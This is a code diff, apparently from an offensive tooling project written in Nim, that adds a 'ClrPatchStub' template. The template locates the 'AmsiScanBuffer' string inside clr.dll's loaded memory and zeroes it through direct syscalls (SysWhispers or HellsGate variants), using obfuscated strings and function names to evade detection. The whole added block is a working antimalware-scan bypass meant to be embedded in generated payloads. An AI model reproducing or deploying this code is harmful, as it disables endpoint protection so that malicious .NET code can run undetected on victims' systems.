@@ -1106,6 +1106,176 @@ let UnhookStub * = """
 
 """
 
+let ClrPatchStub * = """
+
+
+
+    proc containsSequence(buffer: seq[byte], searchBytes: seq[byte]): int =
+        if searchBytes.len > buffer.len:
+            return 0
+        
+        for i in 0..(buffer.len - searchBytes.len):
+            var found = true
+            for j in 0..<searchBytes.len:
+                if buffer[i + j] != searchBytes[j]:
+                    found = false
+                    break
+            if found:
+                return i  # Return the offset where the sequence was found
+        return 0  # Return 0 if nothing was found
+
+
+    proc clrPatch(): bool =
+        clrStart()
+        Sleep(1000)
+        
+        var hModule = GetModuleHandleA(obf("clr.dll"))
+        if hModule == 0:
+            when defined(verbose):
+                echo "Failed to get handle to clr.dll"
+            return false
+
+
+        var mbi: MEMORY_BASIC_INFORMATION
+        var baseAddress: LPVOID = cast[LPVOID](hModule)
+
+        while VirtualQuery(baseAddress, addr mbi, sizeof(mbi)) != 0:
+            when defined(verbose):
+                echo "Checking section at address: ", cast[string](repr(baseAddress))
+            
+            if mbi.Protect == PAGE_READONLY:
+                when defined(verbose):
+                    echo "Found READ_WRITE section at address: "#, cast[string](repr(baseAddress))
+                var buffer: seq[byte]
+                buffer.setLen(mbi.RegionSize)
+                if ReadProcessMemory(GetCurrentProcess(), baseAddress, addr buffer[0], mbi.RegionSize, nil):
+                
+                    let searchString1 = obf("Am")
+                    let searchString2 = obf("siSc")
+                    let searchString3 = obf("anBu")
+                    let searchString4 = obf("ffer")
+                    let searchString = searchString1 & searchString2 & searchString3 & searchString4
+                    let searchBytes: seq[byte] = toByteSeq(searchString) 
+                    let searchLen = 15
+                    let checkOffset: int = containsSequence(buffer, searchBytes)
+                    
+                    if checkOffset > 0:
+                        when defined(verbose):
+                            echo "Found AmsiScanBuffer at offset: ", checkOffset
+                        var zeroBuffer: seq[byte]
+                        zeroBuffer.setLen(searchLen)
+                        for j in 0..<searchLen:
+                            zeroBuffer[j] = 0x00
+                        var write_address: LPVOID = cast[LPVOID](cast[uint](baseAddress) + cast[uint](checkOffset))
+                        when defined(verbose):
+                            echo "Going to patch at address: ", cast[string](repr(write_address))
+                        var protectAddress: LPVOID = write_address
+                        var friendlycodeLength: SIZE_T = cast[SIZE_T](searchLen)
+                        var t: ULONG
+                        var op: DWORD
+                        var disabled: bool = false
+
+                        var pHandle: HANDLE = -1
+                        var 
+                            status          : NTSTATUS          = 0x00000000
+                            buffer          : LPVOID
+                        
+                        when defined(SysWhispers):
+                            status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
+                                    
+                            if not NT_SUCCESS(status):
+                                when defined(verbose):
+                                    echo obf("[-] Failed to change memory protections.")
+                            else:
+                                when defined(verbose):
+                                    echo obf("[*] Applying Syscall (SysWhispers) CLR patch")
+
+                            var 
+                                bytesWritten: SIZE_T
+
+                            var outLength: SIZE_T
+                            status = oqiazasusjk(pHandle,write_address,unsafeAddr zeroBuffer[0],SIZE_T(searchLen),addr outLength)
+
+                            if not NT_SUCCESS(status):
+                                when defined(verbose):
+                                    echo obf("[-] Failed to write memory.")
+                            else:
+                                when defined(verbose):
+                                    echo obf("[+] oqiazasusjk Succeed!")
+                                    
+                                
+                            status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                                    
+                            if not NT_SUCCESS(status):
+                                when defined(verbose):
+                                    echo obf("[-] Failed to allocate memory.")
+                            else:
+                                when defined(verbose):
+                                    echo obf("[+] OldProtect set back")
+                                disabled = true
+                        else:
+                            when defined(HellsGate):
+                                if getSyscall(ntProtectTable):                
+                                    syscall = ntProtectTable.wSysCall
+                                else:
+                                    when defined(verbose):
+                                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                            success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+                            if (success != 0):
+                                when defined(verbose):
+                                    echo obf("NtProtectVirtualMemory failed")
+                                return disabled
+                            when defined(verbose):
+                                echo obf("[*] Applying Syscall CLR patch")
+
+                            when defined(HellsGate):
+                                if getSyscall(ntWriteTable):
+                                    syscall = ntWriteTable.wSysCall
+                                else:
+                                    when defined(verbose):
+                                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                            var outLength: SIZE_T
+                        
+                            success = NtWriteVirtualMemory(pHandle,write_address,unsafeAddr zeroBuffer[0],SIZE_T(searchLen),addr outLength)
+                        
+                            if (success != 0):
+                                when defined(verbose):
+                                    echo obf("NtWriteVirtualMemory failed")
+                                return disabled
+                            
+                            when defined(HellsGate):
+                                if getSyscall(ntProtectTable):
+                                    syscall = ntProtectTable.wSysCall
+                                else:
+                                    when defined(verbose):
+                                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                            success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                            if (success != 0):
+                                when defined(verbose):
+                                    echo obf("NtProtectVirtualMemory failed")
+                                return disabled
+                            else:
+                                when defined(verbose):
+                                    echo obf("[*] OldProtect set back")
+                                disabled = true
+                            return disabled
+
+                else:
+                    when defined(verbose):
+                        echo "Failed to read memory"
+            else:
+                when defined(verbose):
+                    echo obf("Skipping non-READONLY section")
+            baseAddress = cast[LPVOID](cast[uint](baseAddress) + cast[uint](mbi.RegionSize))
+
+        return false
+
+
+    discard clrPatch()
+
+
+"""
+
 let AMSINtCreateSectionHookStubFirst * = """
 
 
